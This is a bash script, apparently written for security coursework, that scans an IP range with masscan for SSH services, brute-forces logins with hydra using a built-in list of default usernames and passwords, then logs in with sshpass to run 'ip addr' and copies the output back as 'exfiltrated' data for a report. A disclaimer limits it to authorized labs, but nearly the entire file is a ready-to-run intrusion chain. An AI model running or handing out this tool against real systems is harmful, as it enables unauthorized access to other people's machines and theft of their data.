#!/bin/bash

# ==============================================================================
# RESPONSIBLE USE DISCLAIMER & AUTHORIZED USE POLICY
# ==============================================================================
# This cybersecurity tool was developed solely for academic and educational 
# purposes within a structured coursework project setting. 
#
# AUTHORIZED USE ONLY:
# This tool is strictly intended for use in controlled lab environments or on
# systems where you have explicit, written authorization from the owner. 
# Unauthorized testing, scanning, or exploitation of computer systems is 
# illegal and punishable by law.
#
# ACADEMIC "AS-IS" WARRANTY NO-LIABILITY:
# This script is provided "AS IS", without warranty of any kind, express or
# implied. The author assumes no liability and
# are not responsible for any misuse, damage, data loss, or legal actions 
# arising from the deployment or utilization of this software.
#
# Users are entirely responsible for compliance with local, national, and 
# international cybersecurity laws and regulations.
# ==============================================================================

# Features
# 1. Scans for SSH services on user-specified IP ranges.
# 2. Brute-forces SSH logins on IP addresses verified to be running SSH services.
# 3. Automatically log in to target machine with open ssh port, runs ip addr on the target,
# and exfiltrate the data. 
# 4. Report generation upon successful ssh scan, brute force, and post-exploitation activity.

# Required tools: masscan, sshpass, hydra

# Usage: Run ./ssh-auth-test.sh
# Note: sudo permission is needed for masscan.

# Prompt the user for an IP range or subnet to scan.
# Validate that the provided range is correctly formatted.
# Notes: We will keep some variables as constants. The purpose of constants is
# to avoid repeating the same values when we are reusing them.
# Test data:
# Proper IP: 192.168.1.137
# IP range: 192.168.1.137-192.168.1.138
# Incorrect IP: 111.111.500.600
# CIDR notation: 192.168.1.1/24
# Constants required for the script
# VALIDATION_SINGLE_IP='((25[0-5]|2[0-4][0-9]|[01]?[0-9]{1,2})\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9]{1,2}?)'
VALIDATION_SINGLE_IP='^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$'
VALIDATION_RANGE_IP='^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))-(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$'
VALIDATION_SUBNET='^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\/([0-9]|[12][0-9]|3[0-2])$'
directory=$(pwd)
userdefaultarr=("admin", "root", "user", "tc")
pwdefaultarr=("admin", "root", "user", "tc")


# Check that the required plugins are installed, otherwise, need user to install them.
# Required: masscan, hydra, sshpass
# Note: If the user does not want to install these, program will terminate, as these plugins are needed for the script to run.
function checkReqPlugins()
{
	echo "Checking required plugins..."
	if ! command -v masscan &> /dev/null; then
		echo "Masscan is not installed"
		read -p "Do you want to install it? (y/n) " -n 1 -r
		echo
		if [[ $REPLY =~ ^[Yy]$ ]]; then # user can enter either y or Y.
			sudo apt install -y "masscan"
		else
			echo "Skipping installation of masscan."
			exit
		fi
	else
		echo "Masscan is installed."
    fi
    
    if ! command -v hydra &> /dev/null; then
		echo "Hydra is not installed. Would you like to install it?"
		read -p "Do you want to install it? (y/n) " -n 1 -r
		echo
		if [[ $REPLY =~ ^[Yy]$ ]]; then
			sudo apt install -y "hydra"
		else
			echo "Skipping installation of hydra."
			exit
		fi
	else
		echo "Hydra is installed."	
    fi
    if ! command -v sshpass &> /dev/null; then
		echo "Sshpass is not installed. Would you like to install it?"
		read -p "Do you want to install it? (y/n) " -n 1 -r
		echo
		if [[ $REPLY =~ ^[Yy]$ ]]; then
			sudo apt install -y "sshpass"
		else
			echo "Skipping installation of sshpass."
			exit
		fi
	else
		echo "sshpass is installed."	
    fi
	
}

# Validate the IP here
function getIP()
{
	read -p "Enter an IP range or subnet: " ipinput
	echo "Your input is $ipinput"
	if [[ "$ipinput" =~ $VALIDATION_SUBNET ]]; 
	then
		echo "$ipinput is a subnet."
	elif [[ "$ipinput" =~ $VALIDATION_RANGE_IP ]];
	then
		echo "$ipinput is a range IP."
	elif [[ "$ipinput" =~ $VALIDATION_SINGLE_IP ]];
	then
		echo "$ipinput is a single IP."	
	else
		echo "IP invalid. Input a valid IP address."
		exit 1
	fi	
}


# Scan the validated IP range specifically for hosts with SSH running.
# Collect and list all IPs that have an active SSH service.
# Note: We'll need to account for the possibility of non-standard ports, hence the scanning of multiple ports here.
function scanIP()
{
	echo "IP scanning in progress"
	# Adjust the range here if more or less than 300 ports are needed.
    scanResults=$(sudo masscan -p1-300 "$ipinput" --banners)
    # Check if the scan results are empty or does not contain ssh services. If empty then let user know and exit immediately.
    if [[ -z "$scanResults"  || "$scanResults" != *"[ssh]"* ]];
    then
		echo "No IP addresses with active ssh found."
		exit 1 # general error
    fi
    echo "Scan results:"
    echo "$scanResults"
    echo "$scanResults" | grep -F "[ssh]" | awk '{print $6 $4}' | cut -d'/' -f1 > iplist.lst
    echo "IP scan completed."
}


#  Allow the tool to use either a built-in list of SSH credentials or accept a user provided credentials file.
#  Attempt to brute force SSH logins on the discovered hosts using these credentials. 
function bruteforce()
{
	# Default state of the flags, if user / password pair is used instead of file
	userflag="-l"
	pwflag="-p"
	# We'll need to detect if the input is a filename, otherwise, it is treated as a single input
	read -p "Enter a user file or username to test: " userinput
	read -p "Enter a password file or password to test: " passinput
	
	# Check if the input is empty. If empty then use default.
	if [[ -z "$userinput" ]]; then
		echo "No file/username added. Retrieving from pre-built username set."
		for element in "${userdefaultarr[@]}"; do
			echo "$element" >> userdefault.lst
		done
		userinput="userdefault.lst"
	fi
	if [[ -z "$passinput" ]]; then
		echo "No file/password added. Retrieving from pre-built password set."
		for element in "${pwdefaultarr[@]}"; do
			echo "$element" >> pwdefault.lst
		done
		passinput="pwdefault.lst"
	fi
	
	if [[ -f "$userinput" ]]; then
		userflag="-L"
	fi
	
	if [[ -f "$passinput" ]]; then
		pwflag="-P"
	fi
	
	while IFS= read -r line;
	do
		echo $line # debugging to ensure that the IP address for each line is shown
		# Get the ip then port number for each line
		ipfromlist=$(echo $line | cut -d':' -f1)
		portfromlist=$(echo $line | cut -d':' -f2)
		# This is to make sure that we can get the ssh service from non-standard ports
		hydraoutput=$(hydra $userflag $userinput $pwflag $passinput $ipfromlist -s $portfromlist ssh)
		echo "$hydraoutput"
		echo "$hydraoutput" | grep 'host' >> hydraresult.lst # use host for grep as using ssh will add unneeded line
	done < iplist.lst
	if [[ -z "$(cat hydraresult.lst | grep 'host' | grep -F '[ssh]')" ]];
	then
		echo "IP brute force failed. Choose another user/pw credentials set and try again."
		rm userdefault.lst
		rm pwdefault.lst
		rm hydraresult.lst # remove unneeded files
		exit 1
	fi
	# Remove the default user and pw files if they are present.
	if [[ -f "userdefault.lst" ]];
	then
		rm userdefault.lst
		echo "userdefault.lst removed as it is no longer needed."
	fi
	
	if [[ -f "pwdefault.lst" ]];
	then
		rm pwdefault.lst
		echo "pwdefault.lst removed as it is no longer needed."
	fi
	echo "Brute force attempts completed."
}	

# On successful login, run a predefined command on the remote machine non interactively by running ip addr. 
# Do not open an interactive shell; all actions should be automated commands.
# Then, copy the ipaddr.txt file locally and add it to the report.
function postex()
{
	# Put all data here for looping
	# Loop through a list
	# cat "hydraresult.lst"
	while IFS= read -r line;
	do
		echo $line
		ipline=$(echo $line | awk {'print $3'})
		userlineinput=$(echo $line | awk {'print $7'}) # get username
		passlineinput=$(echo $line | awk {'print $9'}) # get password
		portinput=$(echo $line | awk -F'[][]' '{print $2}')
		sshpass -p "$passlineinput" ssh -o StrictHostKeyChecking=no "-p$portinput" "$userlineinput"@"$ipline"  "ip addr > /tmp/ipaddr$ipline.txt" < /dev/null 
		echo "Logged in to $ipline"
		sshpass -p "$passlineinput" scp -o StrictHostKeyChecking=no "-P$portinput" "$userlineinput"@"$ipline":"/tmp/ipaddr$ipline.txt" "$directory" < /dev/null
		echo "Exfiltrated ip addr cmd result file for $ipline"
		ipaddrresult="$(cat ipaddr$ipline.txt)"
		echo "$ipaddrresult" >> ipreports.txt
		echo "" >> ipreports.txt
		echo "Logged result for $ipline in ipreports.txt"
		rm "ipaddr$ipline.txt" # Remove the files after the data is added into ip reports file.
	done < hydraresult.lst
	echo "Post-exploitation completed."
}


# After all the steps, generate a report rpt.txt here.
# Report format: rpt(date and time).txt, so as to differentiate the reports.
function generateReport()
{
	dateandtime=$(date "+%F__%T") 
	echo "Final Report" >> "rpt$dateandtime.txt"
	echo "" >> "rpt$dateandtime.txt"
	echo "IP Addresses with open ssh ports: " >> "rpt$dateandtime.txt"
	cat "iplist.lst" >> "rpt$dateandtime.txt"
	echo "" >> "rpt$dateandtime.txt"
	echo "Hydra BF Results: " >> "rpt$dateandtime.txt"
	cat "hydraresult.lst" >> "rpt$dateandtime.txt"
	echo "" >> "rpt$dateandtime.txt"
	echo "Post-exploitation files: " >> "rpt$dateandtime.txt"
	cat "ipreports.txt" >> "rpt$dateandtime.txt"
	echo "" >> "rpt$dateandtime.txt"
	echo "Report rpt$dateandtime.txt generated."
}

# Remove unneeded files afterwards
function tearDown()
{	
	rm iplist.lst
	rm hydraresult.lst
	rm ipreports.txt
	echo "Removed the following as they are unneeded:"
	echo "iplist.lst"
	echo "hydraresult.lst"
	echo "ipreports.txt"
	echo "Operation completed."
}

# Functions will be executed here
checkReqPlugins
getIP
scanIP
bruteforce
postex
generateReport
tearDown
